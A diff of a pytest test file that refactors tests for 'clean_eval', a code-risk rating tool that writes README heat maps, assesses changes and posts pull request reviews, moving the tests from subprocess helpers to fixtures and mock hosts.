-        assert "score=52 " in posts[1]["body"]  # scores are integers 0-100
-        dismissed = [c["args"] for c in calls if "PUT" in c["args"]]
-        assert len(dismissed) == 1
-        assert any(a.endswith("/reviews/10/dismissals") for a in dismissed[0])
 
-    def test_only_on_diff_comments_attached(self):
-        ctx = os.path.join(self.out, "ctx")
-        write_json(
-            os.path.join(ctx, "diff", "index.json"),
-            [
-                {
-                    "file": "a.py",
-                    "module": None,
-                    "patch": "diff/001.patch",
-                    "patch_lines": 8,
-                    "added": 1,
-                    "removed": 1,
-                    "truncated": False,
-                }
-            ],
-        )
-        write(
-            os.path.join(ctx, "diff", "001.patch"),
-            "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,3 +1,3 @@\n x\n-y\n+Y\n z\n",
-        )
-        assert lines_on_diff(FileSystemGateway(), ctx) == {"a.py": {1, 2, 3}}
-        res = read_json(os.path.join(self.out, "result.json"))
-        res["findings"][0]["line"] = 40  # outside the diff
-        res["findings"].append({**res["findings"][0], "line": 2, "summary": "on diff"})
-        write_json(os.path.join(self.out, "result.json"), res)
-        self.bin.gh({"post_review": {"out": {"id": 5, "user": {"login": "x[bot]"}}}, "list_reviews": {"out": []}})
-        assert self.post(ctx) == 0
-        posts = [json.loads(c["stdin"]) for c in self.bin.gh_calls() if "POST" in c["args"]]
-        assert len(posts) == 1  # no 422 retry needed
-        assert [c["line"] for c in posts[0]["comments"]] == [2]
-        assert "`a.py:40`" in posts[0]["body"]
+    @pytest.mark.parametrize(
+        "host", [{"post_review.side_effect": RemoteError("gh api -X failed: HTTP 403")}], indirect=True
+    )
+    def test_all_attempts_fail(
+        self,
+        host,
+        post_args,
+        cli_runner,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 1
+        assert host.post_review.call_count == 4
+        host.reviews.assert_not_called()
 
-    def test_all_attempts_fail(self):
-        self.bin.gh({"post_review": {"exit": 1, "err": "HTTP 403"}})
-        assert self.post() == 1
-        assert len([c for c in self.bin.gh_calls() if "POST" in c["args"]]) == 4
-
-    def test_an_unreadable_reply_is_not_posted_twice(self):
-        self.bin.gh({"post_review": {"exit": 0, "out": "<html>oops</html>"}, "list_reviews": {"out": []}})
-        assert self.post() == 0
-        assert len([c for c in self.bin.gh_calls() if "POST" in c["args"]]) == 1
-        assert not [c for c in self.bin.gh_calls() if "PUT" in c["args"]]
+    @pytest.mark.parametrize(
+        "host",  # HostReview(): what the gateway makes of a reply to a post that it can't read
+        [{"post_review.return_value": HostReview(), "reviews.return_value": []}],
+        indirect=True,
+    )
+    def test_an_unreadable_reply_is_not_posted_twice(
+        self,
+        host,
+        post_args,
+        cli_runner,
+    ):
+        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
+        host.post_review.assert_called_once()
+        host.dismiss_review.assert_not_called()
 
 
-# The command line end to end: `python -I clean_eval <command>` (the environment uv.lock pins) on throwaway repositories.
+@pytest.mark.parametrize(
+    "agent_review",
+    [{"findings": [{**BLOCKER, "line": 40}, UNPLACED, {**BLOCKER, "line": 2, "summary": "on diff"}]}],
+    indirect=True,
+)
+@pytest.mark.parametrize("context_files", [DIFF], indirect=True)
+@pytest.mark.parametrize(
+    "host", [{"post_review.return_value": HostReview(id=5, user="x[bot]"), "reviews.return_value": []}], indirect=True
+)
+class TestPostOnTheDiff:
+    """With the diff in the context, `post` attaches inline only the findings on lines of the diff, which GitHub
+    accepts, and lists the others in the review's body."""
 
-pytestmark = pytest.mark.e2e  # every test runs `python -I clean_eval ...` in a subprocess
+    def test_only_on_diff_comments_attached(
+        self,
+        host,
+        post_args,
+        cli_runner,
+        ci_folders,
+    ):
+        assert lines_on_diff(FileSystemGateway(), ci_folders.ctx) == {"a.py": {1, 2, 3}}
+        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
+        host.post_review.assert_called_once()  # no 422 retry needed
+        post = host.post_review.call_args.args[1]
+        assert [comment.line for comment in post.comments] == [2]
+        assert "`a.py:40`" in post.body
 
-CE = os.path.join(ROOT, "clean_eval")
+
+class TestCommands:
+    """The commands of the command line: the README section is the only publishing output, so the old ones are gone."""
+
+    def test_the_usage_lists_the_commands(
+        self,
+        run_cli,
+        tmp_path,
+    ):
+        usage = run_cli("--help", cwd=tmp_path).stdout
+        listed = [line.split()[0] for line in usage.split("Commands:\n", 1)[1].splitlines() if line.strip()]
+        assert listed == COMMANDS
+        assert run_cli("-h", cwd=tmp_path).stdout == usage
+
+    @pytest.mark.parametrize("gone", ["render", "diagram"])
+    def test_a_removed_command_fails(
+        self,
+        run_cli,
+        tmp_path,
+        gone,
+    ):
+        assert run_cli(gone, "x", cwd=tmp_path).returncode != 0
 
 
-def run(repo, *args):
-    return subprocess.run([sys.executable, "-I", CE, *args], cwd=repo, capture_output=True, text=True)
+@pytest.mark.parametrize("history", [BILLING], indirect=True)
+class TestRate:
+    """`rate` rates the working tree, or a past revision read from git objects, into data.json; `report` summarizes
+    it."""
 
-
-D = lambda s: dt.datetime.fromisoformat(s + "T12:00:00+00:00")  # noqa: E731
-
-
-class TestCli:
-    @pytest.fixture(autouse=True, scope="class")
-    @classmethod
-    def repository(cls, tmp_path_factory):
-        """A repository with two commits, and a folder for the commands' output (made once for the class)."""
-        cls.repo = r = Repo(tmp_path_factory.mktemp("repo"))
-        cls.base = r.commit(
-            "init",
-            {
-                "src/billing/core.py": "import requests\n\ndef charge(x):\n    return requests.post('u', json=x)\n"
-                + "\n".join("def f%d(a):\n    return a\n" % i for i in range(60)),
-                "src/billing/models.py": "class Invoice:\n    pass\n" * 40,
-                "src/users/api.py": "from src.billing.core import charge\n\ndef sign_up(u):\n    return charge(u)\n"
-                * 30,
-                "tests/test_core.py": "from src.billing.core import charge\n\ndef test_charge():\n    assert charge\n",
-            },
-            when=days_ago(4),
-        )
-        cls.head = r.commit(
-            "feat: users",
-            {
-                "src/users/api.py": "def sign_up(u):\n    return u\n",
-                "docs/x.md": "doc\n",
-                "infra/main.tf": "resource {}\n",
-            },
-            when=days_ago(2),
-        )
-        cls.out = str(tmp_path_factory.mktemp("out"))
-
-    def test_rate_and_report(self):
-        r = run(self.repo.path, "rate", "--depth", "2", "--out", self.out)
-        assert r.returncode == 0, r.stderr
-        data = json.loads(read(os.path.join(self.out, "data.json")))
-        assert sorted(m["name"] for m in data["modules"]) == ["src/billing", "src/users"]
+    def test_rate_and_report(
+        self,
+        repo,
+        run_cli,
+        tmp_path,
+    ):
+        rated = run_cli("rate", "--depth", "2", "--out", str(tmp_path), cwd=repo.path)
+        assert rated.returncode == 0, rated.stderr
+        data = json.loads((tmp_path / "data.json").read_text())
+        assert sorted(module["name"] for module in data["modules"]) == ["src/billing", "src/users"]
         assert "Policy: clean-eval default" in data["notes"]
-        report = run(self.repo.path, "report", os.path.join(self.out, "data.json"))
+        report = run_cli("report", str(tmp_path / "data.json"), cwd=repo.path)
         assert "| `src/" in report.stdout
 
-    def test_the_readme_section_is_the_only_publishing_output(self):
-        usage = run(self.repo.path, "--help").stdout
-        assert "{rate,readme,report,assess,history,prepare,finalize,post,redact,guard}" in usage
-        for gone in ("render", "diagram"):
-            assert run(self.repo.path, gone, "x").returncode != 0, gone
+    def test_rate_a_past_revision(
+        self,
+        repo,
+        shas,
+        run_cli,
+        tmp_path,
+    ):
+        rated = run_cli("rate", "--rev", shas[0], "--out", str(tmp_path), cwd=repo.path)
+        assert rated.returncode == 0, rated.stderr
+        assert json.loads((tmp_path / "data.json").read_text())["ref"] == shas[0]
 
-    def test_rate_a_past_revision(self):
-        out = os.path.join(self.out, "rev")
-        r = run(self.repo.path, "rate", "--rev", self.base, "--out", out)
-        assert r.returncode == 0, r.stderr
-        assert json.loads(read(os.path.join(out, "data.json")))["ref"] == self.base
-        bad = run(self.repo.path, "rate", "--rev", self.base, "--graph", "code-review-graph", "--out", out)
-        assert bad.returncode != 0
-        assert "only --graph builtin" in bad.stderr
+    def test_a_past_revision_takes_only_the_builtin_graph(
+        self,
+        repo,
+        shas,
+        run_cli,
+        tmp_path,
+    ):
+        refused = run_cli(
+            "rate", "--rev", shas[0], "--graph", "code-review-graph", "--out", str(tmp_path), cwd=repo.path
+        )
+        assert refused.returncode != 0
+        assert "only --graph builtin" in refused.stderr
 
-    def test_readme_is_written_once_then_left_alone(self, repo):
-        repo.commit("init", {"app/a.py": "def a():\n    return 1\n", "README.md": "# App\n"}, when=days_ago(2))
-        out = os.path.join(self.out, "readme")
-        assert run(repo.path, "rate", "--out", out).returncode == 0
-        status = os.path.join(out, "status.json")
-        first = run(repo.path, "readme", os.path.join(out, "data.json"), "--status-json", status)
-        assert first.returncode == 0, first.stderr
-        assert json.loads(read(status))["readme_changed"]
-        text = read(os.path.join(repo.path, "README.md"))
-        assert text.startswith("# App\n\n## Risk Heat Map\n\n<!-- risk-heat-map:start -->")
-        assert "](docs/risk-heatmap.svg)" in text
-        assert os.path.exists(os.path.join(repo.path, "docs", "risk-heatmap.svg"))
-        again = run(repo.path, "readme", os.path.join(out, "data.json"), "--status-json", status)
-        assert "unchanged" in again.stdout
-        assert not json.loads(read(status))["readme_changed"]
 
-    def test_assess_a_change_from_its_base(self):
-        r = run(self.repo.path, "assess", "--base", self.base, "--head", self.head)
-        assert r.returncode == 0, r.stderr
-        risk = json.loads(r.stdout)
+@pytest.mark.parametrize("history", [BILLING], indirect=True)
+class TestAssess:
+    """`assess` rates the base of a change and gives the risk of each path it changes."""
+
+    def test_assess_a_change_from_its_base(
+        self,
+        repo,
+        shas,
+        run_cli,
+    ):
+        assessed = run_cli("assess", "--base", shas[0], "--head", shas[1], cwd=repo.path)
+        assert assessed.returncode == 0, assessed.stderr
+        risk = json.loads(assessed.stdout)
         assert risk["files"]["src/users/api.py"] == "src/users"
         assert risk["ignored"] == ["docs/x.md"]
-        mods = {m["module"]: m for m in risk["modules"]}
-        assert not mods["infra"]["rated"]
-        assert mods["infra"]["band"] == "Moderate"
+        modules = {module["module"]: module for module in risk["modules"]}
+        assert not modules["infra"]["rated"]
+        assert modules["infra"]["band"] == "Moderate"
         assert risk["max_band"] in ("Moderate", "High", "Critical")
 
-    def test_invalid_policy_is_reported_not_raised(self, repo):
-        repo.commit(
-            "init", {"a/b.py": "x = 1\n", ".clean-eval/risk-model.json": '{"window_days": 30}'}, when=days_ago(1)
-        )
-        r = run(repo.path, "rate", "--out", os.path.join(self.out, "bad"))
-        assert r.returncode != 0
-        assert "v1 model" in r.stderr
-        assert "Traceback" not in r.stderr
+
+@pytest.mark.parametrize("history", [APP_WITH_README], indirect=True)
+class TestReadme:
+    """`readme` writes the heat map into the README's section and the diagram once, then leaves them alone while the
+    ratings stay the same."""
+
+    def test_readme_is_written_once_then_left_alone(
+        self,
+        repo,
+        run_cli,
+        tmp_path,
+    ):
+        data, status = str(tmp_path / "data.json"), tmp_path / "status.json"
+        assert run_cli("rate", "--out", str(tmp_path), cwd=repo.path).returncode == 0
+        first = run_cli("readme", data, "--status-json", str(status), cwd=repo.path)
+        assert first.returncode == 0, first.stderr
+        assert json.loads(status.read_text())["readme_changed"]
+        text = Path(repo.path, "README.md").read_text()
+        assert text.startswith("# App\n\n## Risk Heat Map\n\n<!-- risk-heat-map:start -->")
+        assert "](docs/risk-heatmap.svg)" in text
+        assert Path(repo.path, "docs", "risk-heatmap.svg").exists()
+        again = run_cli("readme", data, "--status-json", str(status), cwd=repo.path)
+        assert "unchanged" in again.stdout
+        assert not json.loads(status.read_text())["readme_changed"]
+
+
+@pytest.mark.parametrize("history", [V1_POLICY], indirect=True)
+class TestAnInvalidPolicy:
+    """A repository's risk-model.json that doesn't validate is reported, with a non-zero status, not raised."""
+
+    def test_invalid_policy_is_reported_not_raised(
+        self,
+        repo,
+        run_cli,
+        tmp_path,
+    ):
+        rated = run_cli("rate", "--out", str(tmp_path), cwd=repo.path)
+        assert rated.returncode != 0
+        assert "v1 model" in rated.stderr
+        assert "Traceback" not in rated.stderr
 
 
 class TestHistoryCommand:
     """The eval skill runs `uv run ... python -I <checkout>/clean_eval history ...` from the repository it evaluates."""
 
-    @pytest.fixture(autouse=True)
-    def folder(self, tmp_path):
-        self.dir = str(tmp_path)
-
-    def run_ce(self, *args):
-        return subprocess.run(
-            [sys.executable, "-I", CE, "history", *args], cwd=self.dir, capture_output=True, text=True
-        )
-
-    def test_replay_and_sensitivity_from_any_folder(self):
-        r = Repo(self.dir)
-        r.commit("init", {"src/a/x.py": "1\n"}, when=D("2026-01-01"))
-        r.commit("feat: a (#1)", {"src/a/x.py": "2\n"}, when=D("2026-02-01"))
-        r.commit("fix: a (#2)", {"src/a/x.py": "3\n"}, when=D("2026-02-02"))
-        out = os.path.join(self.dir, "h.json")
-        res = self.run_ce("--since", "2026-01-15", "--until", "2026-02-28", "--out", out)
+    @pytest.mark.parametrize("history", [FIXED_FEATURE], indirect=True)
+    def test_replay_and_sensitivity_from_any_folder(
+        self,
+        repo,
+        run_cli,
+        tmp_path,
+    ):
+        collected, candidate = str(tmp_path / "h.json"), tmp_path / "candidate.json"
+        res = run_cli("history", "--since", "2026-01-15", "--until", "2026-02-28", "--out", collected, cwd=repo.path)
         assert res.returncode == 0, res.stderr
         assert "2 PRs, 1 with escaped defects" in res.stderr
-        write_json(os.path.join(self.dir, "candidate.json"), {"business_weights": {"dependents": 0.4}})
-        replayed = self.run_ce("--from-history", out, "--replay", os.path.join(self.dir, "candidate.json"))
+        candidate.write_text(json.dumps({"business_weights": {"dependents": 0.4}}))
+        replayed = run_cli("history", "--from-history", collected, "--replay", str(candidate), cwd=repo.path)
         assert set(json.loads(replayed.stdout)) == {"auc_max_score", "by_band", "band_mix"}
-        rows = json.loads(self.run_ce("--from-history", out, "--sensitivity").stdout)
+        rows = json.loads(run_cli("history", "--from-history", collected, "--sensitivity", cwd=repo.path).stdout)
         assert rows[0]["change"] == "baseline"
 
     @pytest.mark.parametrize(
@@ -569,9 +638,14 @@ class TestHistoryCommand:
         ],
         ids=["sensitivity without a history", "no period", "not a date"],
     )
-    def test_usage_errors_are_reported_not_raised(self, args, message):
-        Repo(self.dir)
-        res = self.run_ce(*args)
+    def test_usage_errors_are_reported_not_raised(
+        self,
+        repo,
+        run_cli,
+        args,
+        message,
+    ):
+        res = run_cli("history", *args, cwd=repo.path)
         assert res.returncode != 0
         assert message in res.stderr
         assert "Traceback" not in res.stderr
